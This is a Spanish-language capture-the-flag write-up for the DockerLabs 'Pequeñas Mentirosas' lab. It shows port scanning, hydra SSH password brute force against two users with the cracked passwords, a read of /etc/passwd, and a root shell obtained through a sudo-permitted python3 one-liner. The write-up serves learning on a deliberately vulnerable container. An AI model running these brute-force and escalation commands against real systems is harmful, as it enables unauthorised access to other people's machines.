# Pequeñas Mentirosas - Writeup

## 📋 Información General

- **Plataforma**: DockerLabs
- **Dificultad**: Easy
- **Categorías**: Fuerza Bruta | Web Exploitation
- **Fecha**: 16/02/2026
- **Tiempo empleado**: 10 minutos
- **Autor**: Samuel Rodriguez aka Testarious

## 🔍 Reconocimiento y Enumeración

### Escaneo de Puertos
```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2
nmap -sCV -p22,80 172.17.0.2
```

**Resultados:**
- Puertos abiertos: 22,80
- Servicios: ssh, http


Como hemos visto en el escaneo de puertos, el puerto 80 está abierto, por lo que accedemos a la web (http://172.17.0.2). Nos encontramos con una página web con un simple texto que dice: "Pista: Encuentra la clave para A en los archivos."

Seguimos con un poco de reconocimiento web buscando directorios, archivos y subdominios lanzando escaneos con gobuster y ffuf.

```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u 172.17.0.2 -H "Host: FUZZ.172.17.0.2" 
```

**Resultados:**
- Directorios encontrados: Ninguno
- Subdominios encontrados: Ninguno

## 💻 Explotación

Como vemos con los escaneos previos, no parece haber nada en el servidor web, por lo que pensando en la pista que nos da la web, procedemos a intentar una fuerza bruta por SSH para el usuario A.

### Vector de Ataque 1: Fuerza Bruta
```bash
hydra ssh://172.17.0.2:22 -l a -P /usr/share/wordlists/seclists/Passwords/stupid-ones-in-production.txt -t 50 
```

**Descripción:**
Se intenta una fuerza bruta por SSH para el usuario A con una lista de contraseñas pequeña en primer lugar.

**Resultados:**
Se consigue la contraseña para el usuario A.

```bash
[22][ssh] host: 172.17.0.2   login: a   password: secret
```

La contraseña para el usuario A es "secret". Asi que procedemos a conectarnos por SSH.

```bash
ssh a@172.17.0.2
```

## 🔐 Escalada de Privilegios

Una vez logueado como el usuario A, procedemos a enumerar el sistema.

### Enumeración Local
```bash
cat /etc/passwd
```

**Resultados:** Usuarios encontrados: spencer

```bash
spencer:x:1000:1000::/home/spencer:/bin/bash
```

Procedemos a intentar una fuerza bruta por SSH para el usuario Spencer.

```bash
hydra ssh://172.17.0.2:22 -l spencer -P /usr/share/wordlists/rockyou.txt -t 50
```

**Resultados**

```bash
[22][ssh] host: 172.17.0.2   login: spencer   password: password1
```

**Descripción:**
Se consigue la contraseña para el usuario Spencer "password1". Accedemos por SSH.

```bash
ssh spencer@172.17.0.2
```

Una vez logueado como el usuario Spencer, procedemos a ver los permisos del usuario. Descubrimos que el usuario Spencer tiene permiso de ejecutar el comando /usr/bin/python3 como root sin contraseña.

```bash
sudo -l

User spencer may run the following commands on 5676aabcc292:
    (ALL) NOPASSWD: /usr/bin/python3
```

Procedemos a crear un script que nos permita obtener una shell como root.

```bash
sudo python3 -c 'import os; os.system("/bin/bash")'
```

¡Y finalmente somos root en la máquina víctima!

## 🛠️ Herramientas Utilizadas

| Herramienta | Versión | Uso específico |
|-------------|---------|----------------|
| nmap | 7.98 | Escaneo de puertos y servicios |
| hydra | 9.6 | Fuerza bruta |
| gobuster | 3.8.2 | Enumeración web |
| ffuf | 2.1 | Enumeración web |
| python3 | 3.10 | Escalada de privilegios |

## 🏆 Conclusión

Este CTF parece bastante introductorio para familiarizarse con el uso de herramientas de fuerza bruta para obtener contraseñas. Sin embargo, lo veo como un buen punto de partida para perder el respeto a resolver los primeros CTFs y ganar confianza. Seguimos! 🚀

